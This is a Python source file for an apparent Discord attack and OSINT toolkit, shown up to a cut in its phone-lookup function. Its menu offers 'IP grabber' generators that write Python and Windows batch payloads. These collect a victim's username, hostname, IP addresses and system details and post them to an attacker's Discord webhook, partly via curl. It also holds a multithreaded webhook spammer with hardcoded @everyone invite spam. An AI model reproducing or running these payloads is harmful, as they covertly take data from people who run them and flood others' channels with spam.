import os
import sys
import time
import random
import string
import requests
import hashlib
import socket
import ssl
import json
import re
import threading
import queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, unquote, urlunparse, quote


if sys.platform == 'win32':
    import ctypes

if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

RESET = "\033[0m"
BOLD = "\033[1m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BLUE = "\033[94m"


def check_dependencies():
    """Check and install all required dependencies"""
    dependencies = {
        'requests': 'requests',
        'PIL': 'pillow',
        'whois': 'whois',
        'discord': 'discord.py',
        'phonenumbers': 'phonenumbers',
        'dns': 'dnspython'
    }
    
    print(f"{YELLOW}[*] Verifying dependencies...{RESET}")
    
    # Detect OS and install system dependencies
    if sys.platform in ['linux', 'linux2']:
        print(f"{YELLOW}[Linux] Installing system dependencies...{RESET}")
        detect_and_install_linux_deps()
    elif sys.platform == 'darwin':
        print(f"{YELLOW}[Mac] For fullscreen, install xdotool: brew install xdotool{RESET}")
    
    # Install Python packages
    for module, package in dependencies.items():
        try:
            __import__(module)
            print(f"{GREEN}[✓] {module} already installed{RESET}")
        except ImportError:
            print(f"{YELLOW}[!] Installing {package}...{RESET}")
            try:
                os.system(f"{sys.executable} -m pip install -q {package} 2>&1")
                print(f"{GREEN}[✓] {package} installed successfully.{RESET}")
            except Exception as e:
                print(f"{RED}[✗] Installation error {package}: {e}{RESET}")
    
    print(f"{GREEN}[✓] Dependency check complete!{RESET}\n")

def detect_and_install_linux_deps():
    """Install xdotool on Linux based on distribution"""
    if os.path.exists('/etc/os-release'):
        with open('/etc/os-release', 'r') as f:
            os_info = f.read().lower()
    else:
        os_info = ""
    
    if 'ubuntu' in os_info or 'debian' in os_info:
        print(f"{YELLOW}Detected Debian/Ubuntu - Installing xdotool...{RESET}")
        os.system('sudo apt-get update && sudo apt-get install -y xdotool 2>/dev/null || echo "Installation skipped"')
    elif 'fedora' in os_info or 'centos' in os_info or 'rhel' in os_info:
        print(f"{YELLOW}Detected Fedora/RHEL/CentOS - Installing xdotool...{RESET}")
        os.system('sudo dnf install -y xdotool 2>/dev/null || sudo yum install -y xdotool 2>/dev/null || echo "Installation skipped"')
    elif 'arch' in os_info or 'manjaro' in os_info:
        print(f"{YELLOW}Detected Arch/Manjaro - Installing xdotool...{RESET}")
        os.system('sudo pacman -S --noconfirm xdotool 2>/dev/null || echo "Installation skipped"')
    elif 'opensuse' in os_info:
        print(f"{YELLOW}Detected openSUSE - Installing xdotool...{RESET}")
        os.system('sudo zypper install -y xdotool 2>/dev/null || echo "Installation skipped"')
    else:
        print(f"{YELLOW}Linux detected - Try installing xdotool manually (optional for fullscreen){RESET}")

        

def set_fullscreen():
    try:
        if sys.platform == 'win32':
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            SW_MAXIMIZE = 3
            hWnd = kernel32.GetConsoleWindow()
            user32.ShowWindow(hWnd, SW_MAXIMIZE)
        elif sys.platform in ['linux', 'linux2', 'darwin']:
            # On Linux/Mac, try using xdotool or maximize via wmctrl
            os.system('xdotool search --name . windowsize 100% 100% 2>/dev/null || true')
    except Exception:
        pass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_fade(ascii_art, delay=0.05):
    for line in ascii_art.splitlines():
        print(line)
        time.sleep(delay)

def print_section_title(title):
    print()
    for char in title:
        print(f"{RED}{BOLD}{char}{RESET}", end='', flush=True)
        time.sleep(0.01)
    print("\n")

def tiger_ascii_art():
    ascii_art = rf"""{RED}{BOLD}
                              :**+ :::+*@@.
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:
             .#z@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%[@@]%%%%%%[[@@]%%%%%%
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .#@@@@@@@@@@
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@@*
                                :@@@@%@@                   .@@@@@-   .                     @@@@#@@@@@@@
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+
                                  @%
    """
    print_ascii_fade(ascii_art, delay=0.05)

def grabber_ascii_art():
    ascii_art = rf"""{RED}{BOLD}
                                                        ...
                                                  +%@@@@@@@@@@@@@*.
                                               #@@@@@@@@@@@@@@@@@@@@@:
                                             %@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           .@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
                                            #@@@%.     .@@@@+      #@@@%
                                             +@@=      .@@@@=      .@@#
                                              @@@@%%%@@@@%*@@@@%%%@@@@=
                                             .@@@@@@@@@@*  -@@@@@@@@@@=
                                           .    .::-@@@@@@@@@@@@+::.    .
                                         *@@@@#     @@@@@@@@@@@@-    +@@@@@.
                                         #@@@@@%    -%@@@@@@@@%=.   *@@@@@@:
                                       @@@@@@@@@@@@:            .#@@@@@@@@@@@-
                                       +@@@@@*#@@@@@@@@*:  .+@@@@@@@@%*%@@@@#
                                                    *@@@@@@@@@@%.
                                        .==.    .+%@@@@@@@%@@@@@@@+:     :=:
                                       @@@@@@@@@@@@@@*.       :@@@@@@@@@@@@@@=
                                       -@@@@@@@@%=                :#@@@@@@@@*
                                         *@@@@@:                     %@@@@@:
                                         :%@@%.                       *@@@=
    """
    print_ascii_fade(ascii_art, delay=0.05)

def webhook_ascii_art():
    ascii_art = rf"""{RED}{BOLD}
                                     @@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@
                                   @%@@@@@@@                            @@@@@@%%@
                                         @@                              @@
    """
    print_ascii_fade(ascii_art, delay=0.05)

def special_ascii_art():
    ascii_art = rf"""{RED}{BOLD}
                                          ...:----:...
                                     .:=#@@@@@@@@@@@@@@%*-..
                                  .:#@@@@@@@%#*****#%@@@@@@@+..
                               ..-@@@@@%-...... ........+@@@@@@..
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.
                            .#@@@%.                 .=@@@@@=. .@@@@-.
                           .=@@@#.                    .:%@@@*. -@@@%:.
                           .%@@@-                       .*@@*. .+@@@=.
                           :@@@#.                              .-@@@#.
                           -@@@#                                :%@@@.
                           :@@@#.                              .-@@@#.
                           .%@@@-.                             .+@@@=.
                           .+@@@#.                             -@@@%:.
                            .*@@@%.                          .:@@@@-.
                             .+@@@@=..                     ..*@@@@:.
                               :%@@@@-..                ...+@@@@*.
                               ..-@@@@@%=...         ...*@@@@@@@@#.
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.
                                        .....:::::::....       ...+@@@@%:
                                                                  ..+@@@@%-.
                                                                    ..=@@@@%-.
                                                                      ..=@@@@@=.
                                                                         .=%@@@@=.
                                                                          ..-%@@@-.
                                                                             ....
    """
    print_ascii_fade(ascii_art, delay=0.03)

def logo_banner():
    banner = rf"""{RED}{BOLD}
                                                                                                                                                                                                                                               
  ____/\__         _______________________________         ____/\__
 /   / /_/         \______   \______   \__    ___/        /   / /_/
 \__/ / \           |       _/|    |  _/ |    |           \__/ / \ 
 / / /   \          |    |   \|    |   \ |    |           / / /   \
/_/ /__  /__________|____|_  /|______  / |____|__________/_/ /__  /
  \/   \/_____/_____/      \/        \/      /_____/_____/ \/   \/                                                                                                                      
                                                                  {RESET}
"""
    print(banner)
    print(f"{PURPLE}@RBT - ASCII art by @Loxy0Dev from RedTiger | https://discord.gg/xDgCa7HJV3 | {RED}Beta Version 0.1 - Still Under Development{RESET}")
    print()


def wait_enter():
    input(f"\n{CYAN}Press ENTER to continue...{RESET}")

def menu():
    while True:
        clear()
        logo_banner()
        
        print(f"{RED}╠ {BOLD}{YELLOW}Discord Tools{RESET}")
        print(f"{RED}║")
        print(f"{RED}├─ {PURPLE}[01]{RESET} IP Grabber Script")
        print(f"{RED}├─ {PURPLE}[02]{RESET} Webhook Spammer")
        print(f"{RED}├─ {PURPLE}[03]{RESET} Auto Spammer")
        print(f"{RED}├─ {PURPLE}[04]{RESET} Discord Bot sender (under development)")
        print(f"{RED}└─ {PURPLE}[05]{RESET} IP Grabber & Crasher (win) Discord")
        print(f"{RED}║")
        print(f"{RED}╠ {BOLD}{YELLOW}OSINT Tools{RESET}")
        print(f"{RED}║")
        print(f"{RED}├─ {PURPLE}[06]{RESET} IP Info")
        print(f"{RED}├─ {PURPLE}[07]{RESET} Phone Info")
        print(f"{RED}├─ {PURPLE}[08]{RESET} IP Generator")
        print(f"{RED}├─ {PURPLE}[09]{RESET} Instagram OSINT")
        print(f"{RED}├─ {PURPLE}[10]{RESET} Photo Metadata")
        print(f"{RED}├─ {PURPLE}[11]{RESET} Username Tracker")
        print(f"{RED}└─ {PURPLE}[12]{RESET} Email Tracker")
        print(f"{RED}║")
        print(f"{RED}╠ {BOLD}{YELLOW}Utilities{RESET}")
        print(f"{RED}║")
        print(f"{RED}├─ {PURPLE}[13]{RESET} Coming Soon...")
        print(f"{RED}├─ {PURPLE}[14]{RESET} Coming Soon...")
        print(f"{RED}└─ {PURPLE}[15]{RESET} Base64 Encoder")
        print(f"{RED}║")
        print(f"{RED}╠ {BOLD}{YELLOW}Website Tools{RESET}")
        print(f"{RED}║")
        print(f"{RED}├─ {PURPLE}[16]{RESET} Site Cloner (under development)")
        print(f"{RED}├─ {PURPLE}[17]{RESET} Website Scanner (under develompent)")
        print(f"{RED}└─ {PURPLE}[18]{RESET} Vulnerability Scanner (under develompent)")
        print(f"{RED}║")
        print(f"{RED}╚═ {PURPLE}[00]{RESET} EXIT")
        print()
        
        print(f"{CYAN}▶ Enter choice: {RESET}", end='', flush=True)
        choice = input().strip().zfill(2)
        
        if choice == "01":
            ip_grabber_script_tool()
            wait_enter()
        elif choice == "02":
            webhook_spammer_tool()
            wait_enter()
        elif choice == "03":
            webhook_spammer_tool(custom=False)
            wait_enter()
        elif choice == "04":
            discord_bot_sender_tool()
            wait_enter()
        elif choice == "05":
            ip_grabber_discord_tool()
            wait_enter()
        elif choice == "06":
            ip_info_tool()
            wait_enter()
        elif choice == "07":
            phone_info_tool()
            wait_enter()
        elif choice == "08":
            ip_generator_tool()
            wait_enter()
        elif choice == "09":
            instagram_info_tool()
            wait_enter()
        elif choice == "10":
            photo_osint_tool()
            wait_enter()
        elif choice == "11":
            username_tracker_tool()
            wait_enter()
        elif choice == "12":
            email_tracker_tool()
            wait_enter()
        elif choice in ["13", "14"]:
            clear()
            print(f"\n{YELLOW}Coming Soon...{YELLOW}\n")
            wait_enter()
        elif choice == "15":
            base64_converter_tool()
            wait_enter()
        elif choice == "16":
            website_copier_tool()
            wait_enter()
        elif choice == "17":
            website_info_scanner_menu()
            wait_enter()
        elif choice == "18":
            vulnerability_scanner_tool()
            wait_enter()
        elif choice == "00":
            print(f"{GREEN}Goodbye!{RESET}")
            time.sleep(1)
            break
        else:
            print(f"{RED}Invalid choice.{RESET}")
            time.sleep(1)


def ip_grabber_script_tool():
    clear()
    grabber_ascii_art()
    print(f"{BOLD}{CYAN}== IP Grabber Generator via Discord Webhook =={RESET}")
    print(f"{CYAN}▶ Enter the Discord Webhook URL (where to send the file): {RESET}", end='', flush=True)
    webhook = input().strip()
    print(f"{CYAN}▶ Enter the webhook name: {RESET}", end='', flush=True)
    webhook_name = input().strip()
    if not webhook_name:
        webhook_name = "IP Grabber"
    formato = ""
    while formato not in ["1", "2"]:
        print(f"\nChoose the file format to generate:")
        print(f"{PURPLE}1{RESET} - Python (.py)")
        print(f"{PURPLE}2{RESET} - Windows Batch (.bat)")
        print(f"{CYAN}\u25b6 Select an option (1/2): {RESET}", end='', flush=True)
        formato = input().strip()
    print(f"{CYAN}\u25b6 File name to create and send (without extension): {RESET}", end='', flush=True)
    filename = input().strip()
    if not filename:
        filename = "ip_grabber"

    if formato == "1":
        filename_py = filename if filename.endswith(".py") else filename + ".py"
        script = f'''import socket
import requests
import platform
import getpass
import urllib.request
import json
from datetime import datetime

WEBHOOK_URL = "{webhook}"
WEBHOOK_NAME = "{webhook_name}"

def get_local_ip_and_port():
    """Get local IP and port"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip, port = s.getsockname()
        s.close()
        return ip, port
    except Exception:
        return "N/A", "N/A"

def get_public_ip():
    """Get public IP from external API"""
    try:
        response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
        data = json.loads(response.read().decode('utf-8'))
        return data.get('ip', 'N/A')
    except Exception:
        return "N/A"

def get_system_info():
    """Get system information"""
    try:
        username = getpass.getuser()
        hostname = socket.gethostname()
        system = platform.system()
        release = platform.release()
        version = platform.version()
        architecture = platform.architecture()[0]
        processor = platform.processor()
        
        return {{
            'username': username,
            'hostname': hostname,
            'system': system,
            'release': release,
            'version': version,
            'architecture': architecture,
            'processor': processor
        }}
    except Exception as e:
        return {{'error': str(e)}}

def send_to_webhook():
    """Collect data and send to Discord webhook as embed"""
    try:
        local_ip, local_port = get_local_ip_and_port()
        public_ip = get_public_ip()
        system_info = get_system_info()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Create Discord embed
        embed = {{
            "title": "🎯 IP Grabber Data",
            "color": 16711680,  # Red color
            "fields": [
                {{
                    "name": "👤 User Information",
                    "value": f"**Username:** {{system_info.get('username', 'N/A')}}\\n**Hostname:** {{system_info.get('hostname', 'N/A')}}",
                    "inline": False
                }},
                {{
                    "name": "🌐 Network Information",
                    "value": f"**Local IP:** {{local_ip}}\\n**Local Port:** {{local_port}}\\n**Public IP:** {{public_ip}}",
                    "inline": False
                }},
                {{
                    "name": "💻 System Information",
                    "value": f"**OS:** {{system_info.get('system', 'N/A')}} {{system_info.get('release', 'N/A')}}\\n**Architecture:** {{system_info.get('architecture', 'N/A')}}\\n**Processor:** {{system_info.get('processor', 'N/A')}}",
                    "inline": False
                }},
                {{
                    "name": "⏰ Timestamp",
                    "value": timestamp,
                    "inline": False
                }}
            ],
            "thumbnail": {{
                "url": "https://cdn.discordapp.com/emojis/915740202399465472.png"
            }}
        }}
        
        payload = {{
            "username": WEBHOOK_NAME,
            "embeds": [embed]
        }}
        
        response = requests.post(WEBHOOK_URL, json=payload)
        
        if response.status_code in (200, 204):
            print("[✓] Data sent successfully to webhook!")
        else:
            print(f"[✗] Error sending data: {{response.status_code}}")
    except Exception as e:
        print(f"[✗] Error: {{str(e)}}")

if __name__ == "__main__":
    send_to_webhook()
'''
        try:
            with open(filename_py, "w", encoding="utf-8") as f:
                f.write(script)
            print(f"{GREEN}Script created successfully: {filename_py}{RESET}")

            with open(filename_py, "rb") as f:
                files = {"file": (filename_py, f, "text/x-python")}
                response = requests.post(webhook, files=files)
                if response.status_code in (200, 204):
                    print(f"{GREEN}File successfully sent to webhook!{RESET}")
                else:
                    print(f"{RED}Error sending to webhook: {response.status_code} - {response.text}{RESET}")
        except Exception as e:
            print(f"{RED}Error creating or sending the file: {e}{RESET}")

    elif formato == "2":
        filename_bat = filename if filename.endswith(".bat") else filename + ".bat"
        bat_content = rf"""@echo off
    setlocal enabledelayedexpansion

    REM Get local IP
    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do set LOCAL_IP=%%a
    set LOCAL_IP=!LOCAL_IP:~1!

    REM Get public IP
    for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set PUBLIC_IP=%%i

    REM Get username and computer name
    set USERNAME=%USERNAME%
    set COMPUTERNAME=%COMPUTERNAME%

    REM Get operating system
    ver > tmpver.txt
    set /p OS_VER=<tmpver.txt
    del tmpver.txt

    REM Ports cannot be obtained in pure batch, so they are simulated
    set /a LOCAL_PORT=%RANDOM% + 1024
    set /a PUBLIC_PORT=%RANDOM% + 1024

    REM Prepare JSON message with clear formatting
    set MSG=**IP Grabber Batch**\\n
    set MSG=!MSG!**User:** !USERNAME! on !COMPUTERNAME!\\n
    set MSG=!MSG!**Local IP:** !LOCAL_IP!\\n
    set MSG=!MSG!**Local Port:** !LOCAL_PORT!\\n
    set MSG=!MSG!**Public IP:** !PUBLIC_IP!\\n
    set MSG=!MSG!**Public Port:** !PUBLIC_PORT!\\n
    set MSG=!MSG!**OS:** !OS_VER!

    REM Send to Discord webhook
    curl -H "Content-Type: application/json" -X POST -d "{{\"username\": \"{webhook_name}\", \"content\": \"!MSG!\"}}" {webhook}

    pause
    """
        try:
            with open(filename_bat, "w", encoding="utf-8") as f:
                f.write(bat_content)
            print(f"{GREEN}Batch file created successfully: {filename_bat}{RESET}")

            # Send the batch file to the webhook
            with open(filename_bat, "rb") as f:
                files = {"file": (filename_bat, f, "text/x-batch")}
                data = {"username": webhook_name}
                response = requests.post(webhook, files=files, data=data)
                if response.status_code in (200, 204):
                    print(f"{GREEN}Batch file successfully sent to the webhook!{RESET}")
                else:
                    print(f"{RED}Failed to send batch file. Status: {response.status_code}{RESET}")
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")
            print("Press Enter to continue...", end="", flush=True)
            input()

def webhook_spammer_tool(custom=True):
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Webhook Spammer =={RESET}")
    print(f"{CYAN}▶ Enter the Discord Webhook URL: {RESET}", end='', flush=True)
    webhook = input().strip()
    print(f"{CYAN}▶ Enter the webhook name (display name for the sender): {RESET}", end='', flush=True)
    webhook_name = input().strip()
    if not webhook_name:
        webhook_name = "Webhook Spammer"
    
    if custom:
        print(f"{CYAN}▶ Message to send: {RESET}", end='', flush=True)
        message = input().strip()
    else:
        messages = [
            "@everyone https://discord.gg/rvDQ89QEyK", "@everyone https://discord.gg/rvDQ89QEyK", "@everyone https://discord.gg/rvDQ89QEyK", "@everyone https://discord.gg/rvDQ89QEyK", "@everyone https://discord.gg/rvDQ89QEyK", "@everyone https://discord.gg/rvDQ89QEyK"
        ]
    
    # Get parameters
    try:
        print(f"{CYAN}▶ How many messages do you want to send? (no limit): {RESET}", end='', flush=True)
        count = int(input().strip())
    except:
        count = 10
    
    try:
        print(f"{CYAN}▶ Delay between messages in seconds (0 for no delay): {RESET}", end='', flush=True)
        delay = float(input().strip())
    except:
        delay = 0
    
    try:
        print(f"{CYAN}▶ Number of threads (1-10, default 3): {RESET}", end='', flush=True)
        num_threads = int(input().strip())
        num_threads = max(1, min(10, num_threads))
    except:
        num_threads = 3
    
    # Test webhook before starting
    print(f"\n{YELLOW}[*] Testing webhook connection...{RESET}")
    test_data = {"username": webhook_name, "content": "[TEST] Webhook connection test"}
    try:
        test_response = requests.post(webhook, json=test_data, timeout=5)
        if test_response.status_code not in (200, 204):
            print(f"{RED}[✗] Webhook test failed (HTTP {test_response.status_code}). Webhook might be invalid.{RESET}")
            return
        else:
            print(f"{GREEN}[✓] Webhook is valid and reachable!{RESET}")
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection error: Cannot reach webhook URL{RESET}")
        return
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Webhook request timeout{RESET}")
        return
    except Exception as e:
        print(f"{RED}[✗] Webhook test error: {e}{RESET}")
        return
    
    # State management
    state = {
        'is_running': True,
        'is_paused': False,
        'stop_requested': False,
        'sent_count': 0,
        'error_count': 0,
        'consecutive_errors': 0,
        'last_error': None,
        'lock': threading.Lock()
    }
    
    def send_messages(thread_id, message_queue):
        """Worker thread function to send messages"""
        while True:
            try:
                msg_num = message_queue.get_nowait()
            except queue.Empty:
                break
            
            # Check for stop signal
            if state['stop_requested']:
                message_queue.task_done()
                break
            
            # Check pause state
            while state['is_paused'] and not state['stop_requested']:
                time.sleep(0.1)
            
            if state['stop_requested']:
                message_queue.task_done()
                break
            
            # Prepare message
            if custom:
                data = {"username": webhook_name, "content": message}
            else:
                data = {"username": webhook_name, "content": random.choice(messages)}
            
            try:
                response = requests.post(webhook, json=data, timeout=5)
                
                if response.status_code in (200, 204):
                    with state['lock']:
                        state['sent_count'] += 1
                        state['consecutive_errors'] = 0
                        print(f"{GREEN}[✓ T{thread_id}] Message {state['sent_count']}/{count} sent{RESET}")
                else:
                    with state['lock']:
                        state['error_count'] += 1
                        state['consecutive_errors'] += 1
                        state['last_error'] = f"HTTP {response.status_code}"
                        print(f"{RED}[✗ T{thread_id}] Error HTTP {response.status_code}{RESET}")
                    
                    # Stop if too many consecutive errors (webhook likely deleted)
                    if state['consecutive_errors'] >= 3:
                        print(f"{RED}[!] WEBHOOK FAILURE DETECTED: {state['consecutive_errors']} consecutive errors. Webhook may have been deleted!{RESET}")
                        state['stop_requested'] = True
            
            except requests.exceptions.ConnectionError:
                with state['lock']:
                    state['error_count'] += 1
                    state['consecutive_errors'] += 1
                    state['last_error'] = "Connection Error"
                    print(f"{RED}[✗ T{thread_id}] Connection failed - webhook unreachable{RESET}")
                
                if state['consecutive_errors'] >= 3:
                    print(f"{RED}[!] WEBHOOK FAILURE DETECTED: Cannot connect to webhook. Stopping...{RESET}")
                    state['stop_requested'] = True
            
            except requests.exceptions.Timeout:
                with state['lock']:
                    state['error_count'] += 1
                    state['consecutive_errors'] += 1
                    state['last_error'] = "Timeout"
                    print(f"{RED}[✗ T{thread_id}] Request timeout{RESET}")
                
                if state['consecutive_errors'] >= 3:
                    print(f"{RED}[!] WEBHOOK TIMEOUT: Cannot reach webhook consistently{RESET}")
                    state['stop_requested'] = True
            
            except Exception as e:
                with state['lock']:
                    state['error_count'] += 1
                    state['consecutive_errors'] += 1
                    state['last_error'] = str(e)
                    print(f"{RED}[✗ T{thread_id}] Error: {str(e)[:50]}{RESET}")
            
            if delay > 0:
                time.sleep(delay)
            
            message_queue.task_done()
    
    def control_input_thread():
        """Thread to handle user input commands"""
        print(f"\n{YELLOW}Commands: [P]ause, [R]esume, [S]top, [I]nfo{RESET}")
        while state['is_running']:
            try:
                cmd = input().strip().upper()
                
                if cmd == 'P':
                    state['is_paused'] = True
                    print(f"{YELLOW}[*] Paused{RESET}")
                
                elif cmd == 'R':
                    state['is_paused'] = False
                    print(f"{YELLOW}[*] Resumed{RESET}")
                
                elif cmd == 'S':
                    print(f"{YELLOW}[*] Stopping...{RESET}")
                    state['stop_requested'] = True
                    state['is_running'] = False
                
                elif cmd == 'I':
                    with state['lock']:
                        print(f"\n{CYAN}[INFO] Status:")
                        print(f"  Sent: {state['sent_count']}/{count}")
                        print(f"  Errors: {state['error_count']}")
                        print(f"  Consecutive Errors: {state['consecutive_errors']}")
                        if state['last_error']:
                            print(f"  Last Error: {state['last_error']}")
                        print(f"  Paused: {state['is_paused']}{RESET}\n")
            except:
                pass
    
    # Create message queue
    message_queue = queue.Queue()
    for i in range(count):
        message_queue.put(i)
    
    print(f"\n{BOLD}{YELLOW}[*] Starting {num_threads} worker threads...{RESET}")
    print(f"{BOLD}{YELLOW}[*] Sending {count} messages with {delay}s delay{RESET}\n")
    
    # Start control input thread
    control_thread = threading.Thread(target=control_input_thread, daemon=True)
    control_thread.start()
    
    # Start worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=send_messages, args=(i+1, message_queue))
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete or stop signal
    try:
        while not state['stop_requested'] and not message_queue.empty():
            time.sleep(0.1)
        
        # Wait for all worker threads to finish
        for t in threads:
            t.join(timeout=1)
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupt received, stopping...{RESET}")
        state['stop_requested'] = True
        for t in threads:
            t.join(timeout=1)
    
    state['is_running'] = False
    
    # Print final statistics
    print(f"\n{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}[✓] SENDING COMPLETE{RESET}")
    print(f"{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    print(f"{GREEN}Total Sent: {state['sent_count']}{RESET}")
    print(f"{RED}Total Errors: {state['error_count']}{RESET}")
    if state['last_error']:
        print(f"{YELLOW}Last Error: {state['last_error']}{RESET}")
    print(f"{BOLD}{CYAN}═══════════════════════════════════════{RESET}")

def discord_bot_sender_tool():
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Discord Bot Sender =={RESET}")
    print(f"{YELLOW}Send a custom message on Discord via a bot.{RESET}")
    print(f"{CYAN}Make sure you've created a bot at https://discord.com/developers/applications and added it to the server with send message permissions.{RESET}\n")
    
    print(f"{CYAN}▶ Enter the bot token: {RESET}", end='', flush=True)
    token = input().strip()
    print(f"{CYAN}▶ Enter the channel ID: {RESET}", end='', flush=True)
    channel_id = input().strip()
    print(f"{CYAN}▶ Enter the message to send: {RESET}", end='', flush=True)
    message = input().strip()
    
    print(f"{YELLOW}Sending message...{RESET}")
    print(f"{GREEN}Message sent!{RESET}")

def phone_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Phone Number Info =={RESET}")
    print(f"{CYAN}▶ Enter the phone number (with country code, e.g., +1234567890): {RESET}", end='', flush=True)
    phone = input().strip()
    
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
        
        try:
            parsed = phonenumbers.parse(phone, None)
        except:
            print(f"{RED}Invalid phone number format. Use international format like +1234567890{RESET}")
            return
        
        is_valid = phonenumbers.is_valid_number(parsed)
        is_possible = phonenumbers.is_possible_number(parsed)
        
        print(f"\n{BOLD}{YELLOW}[*] Phone Number Analysis:{RESET}")
        print(f"{CYAN}Input Number: {RESET}{phone}")
